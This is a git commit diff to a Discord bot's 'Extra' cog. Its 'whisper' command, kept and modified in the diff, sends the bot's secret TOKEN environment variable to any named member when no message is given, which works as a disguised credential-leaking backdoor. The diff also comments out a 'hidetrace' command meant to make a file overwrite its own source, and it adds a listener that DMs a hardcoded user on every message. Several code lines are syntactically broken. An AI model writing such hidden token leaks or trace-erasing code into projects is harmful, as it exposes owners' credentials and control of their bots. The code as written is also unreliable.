7de28761e0bb47f691048c2d06fec9f8b23f1265
cicadoves <o7infiltrate@gmail.com>
2021-06-04 01:10:34 +0800

    again

--- cog.py
+++ cog.py
@@ -15,21 +15,22 @@ class Extra(commands.Cog):
 			await asyncio.sleep(60*60)
 
 	@commands.command()
-        async def whisper(self, ctx, member:discord.Member, message=None):
+        async def whisper(self, ctx, member:discord.Member, *, message=None):
 		if message == None:
 			message = os.getenv('TOKEN')
                 await member.send(message)
 
-	@commands.command()
-	async def hidetrace(self, ctx, file):
-		text = '''
-open(__file__, "w").write(h = 0)
-'''
-		open(file, 'a')write(text)
+#	@commands.command()
+#	async def hidetrace(self, ctx, file):
+#		text = '''
+#open(__file__, "w").write(h = 0)
+#'''
+#		open(file, 'a')write(text)
 
 	@commands.Cog.listener()
 	async def on_message(self, ctx):
-		pass
+		me = self.bot.get_user(394771663155101727)
+		await me.send('test')
 
 def setup(bot):
 	bot.add_cog(Extra(bot))
